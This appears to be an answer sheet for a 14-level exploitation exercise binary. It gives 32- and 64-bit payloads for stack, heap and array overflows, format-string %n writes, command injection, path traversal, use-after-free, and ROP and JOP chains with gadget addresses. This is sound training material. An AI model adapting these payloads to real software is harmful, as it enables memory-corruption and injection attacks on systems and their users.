LEVEL 1	- Integer Overflow
-------
   [32-Bit] 
   ./exploit hello 65536
   
   [64-Bit] 
   ./exploit64 hello 65536
   
   - 65536 or any value higher 134217728

LEVEL 2	- Stack Overflow
-------
   [32-Bit] 
   ./exploit help admin $(python -c "print('aaaabbbbcccc\x44\x1f\x01\x00')")
   - 0x00011f44 points to start of level3password function

   [64-Bit] 
   ./exploit64 help $(python -c "import sys;sys.stdout.buffer.write(b'A'*8+b'bbbbcccc\x78\x11\x40\x00\x00\x00\x00\x00')") test
   - 0x00000000401144 points to the start of level3password function

LEVEL 3 - Array Overflow
-------
   [32-Bit] 
   ./exploit Velvet 33 $(python -c "print('%d' % 0x000120b4)")
   - 0x000120b4 points to start of level4password function

   [64-Bit] 
   ./exploit64 Velvet 34 $(python -c "print('%d' % 0x000000004012c8)")
   - 0x000000004012c8 points to start of level4password function

   - Explanation: Overflowing the array (33 > 32) should overwrite the stack to overwrite lr 

LEVEL 4 - Off by One
-------
   [32-Bit] 
   ./exploit mysecret $(python -c "print('A'*0x100+'\x00')")
   
   [64-Bit] 
   ./exploit64 mysecret $(python -c "print('A'*0x100+'\x00')")
   
   - Explanation: Fill buffer with 256*A and add one single byte to fill flag.

LEVEL 5 - Stack Cookie
-------
   [32-Bit] 
   ./exploit freedom $(python -c "print('A'*64+'\x01\x00\x00\x00'+'\x37\x13\x00\x00')")
   
   [64-Bit] 
   ./exploit64 freedom $(python -c "print('A'*64+'\x01\x00\x00\x00'+'\x37\x13\x00\x00')")
   
   - Explanation: fill "tmp" with 'A'*(64) + fill "flag" with (1) + stack_cookie to (1337)

LEVEL 6 - Format String
-------
   [32-Bit] 
   python -c "print('%08x'*3+'%65c%n')" | ./exploit happyness
   
   [64-Bit] 
   python -c "print('%16lx'*9+'%201c%n')" | ./exploit64 happyness
   
   - r has to be Y instead of N. %65c / %201c is the value to write to get the char 'Y' and %n does write the value.

LEVEL 7 - Heap Overflow
-------
   [32-Bit] 
   ./exploit mypony $(python -c 'print ("A"*40 + "\x63\x67")')

   [64-Bit] 
   ./exploit64 mypony $(python -c 'print ("A"*48 + "\x63\x67")')

LEVEL 8 - Type Confusion
-------
   [32-Bit] 
   ./exploit Exploiter $(python -c 'import sys;sys.stdout.buffer.write(b"A"*(18*4)+b"\x98\xa0\x03\x00")')
   - 0x03a098 is the pointer of b, which is written to g, thus leading to a type confusion

   [64-Bit] 
   ./exploit64 Exploiter $(python -c 'import sys;sys.stdout.buffer.write(b"A"*(20*4)+b"\xa0\x50\x4c\x00\x00\x00\x00\x00")')
   - 0x4c50a0 is the pointer of b, which is written to g, thus leading to a type confusion

LEVEL 9 - Zero Pointers
-------
   [32-Bit] 
   ./exploit Gimme 0xFFFEEE0C 1 1
   
   [64-Bit] 
   ./exploit64 Gimme 0x40007FFC3C 1 1
   
   - 0xFFFEEE1C/0x40007FFC3C is Important ptr, run with arguments "Gimme 0 0" to get a hint :D

LEVEL 10 - Command Injection
--------
   [32-Bit]: 
   ./exploit Fun "aaa ; ls"
   
   [64-Bit]: 
   ./exploit64 Fun "aaa ; ls"

LEVEL 11 - Path Traversal
--------
   [32-Bit] 
   ./exploit Violet dir1/dir2/../../
   
   [64-Bit] 
   ./exploit64 Violet dir1/dir2/../../


LEVEL 12 - Return Oriented Programming (ROP)
--------
   [32-Bit] 
   python -c "import sys;sys.stdout.buffer.write(b'A'*60+b'\xBE\xBA\xFE\xCA'+b'\x10\x14\x01\x00'+b'00001111\x78\x56\x00\x00\x78\x56\x00\x00\x5c\x14\x01\x00')" | ./exploit ropeme

   - Rop structure : 
       [trash filled with buffer size 60] 
       [trash value 0xCAFEBABE]
       [ptr to gadget pop{r0,r1,r2,r3,pc}] @0x011410 to find, use 'rop --grep "pop {r0, r1, r2, r3, pc}"''
       [r0,r1,r2,r3,pc] where pc should point to rop, where r2(flag) get loaded and then compared to r3 (at addr 0x01145c), r3 should have the same value as r2 to pass the compare, r0 and r1 have dummy values 

   [64-Bit] 
   python -c "from struct import pack;import sys;sys.stdout.buffer.write(b'A'*60+b'AAAAAAAABBBB'+pack('<Q',0x400744)+b'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD'+pack('<QQ',0x5678,0x5678)+b'11111111'+pack('<Q',0x400784))" | ./exploit64 ropeme


   - Rop structure : 
	    [trash filled with buffer size 60] 
	    [trash value AAAAAAAABBBB]
	    [ptr to gadget "ldp x0, x1, [sp]","ldp x2, x3, [sp], #0x10", "ldp x29, x30, [sp], #0x20"] @0x400744 where x30 should point to rop, where w0(flag) get loaded and then compared to w1 (at addr 0x400784), w1 should have the same value as w0 to pass the compare

LEVEL 13 - Use after Free
--------
    [32-Bit] 
    python -c "import sys;sys.stdout.buffer.write(b'A'*64+b'\xe0\x15\x01\x00')" | ./exploit Magic 0132
    - 0x0115e0 points to level13password()

    [64-Bit] 
    python -c "import sys;sys.stdout.buffer.write(b'A'*64+b'\x20\x08\x40\x00\x00\x00\x00\x00')" | ./exploit64 Magic 0132
    - 0x400820 points to level13password()



LEVEL 14 - Jump Oriented Programming (JOP)
--------
    [32-Bit] 
    python -c "from struct import pack;fr=open('token.bin','wb');data=pack('<III',0x011588,0x5678,0x5678)+28*b'A'+pack('<I',0x1142c);fr.write(pack('<I',len(data)));fr.write(data)" | ./exploit Jumper token.bin
	-	jmpgadgetstack gadget at 0x01142c
		cmp at 0x11588

    [64-Bit] 
    python -c "from struct import pack;fr=open('token.bin','wb');data=pack('<QQQ',0x5678,0x5678,0x400878)+24*b'A'+pack('<Q',0x400758);fr.write(pack('<I',len(data)));fr.write(data)";./exploit64 Jumper token.bin
    -	jmpgadgetstack at 0x400758
    	cmp at 400878

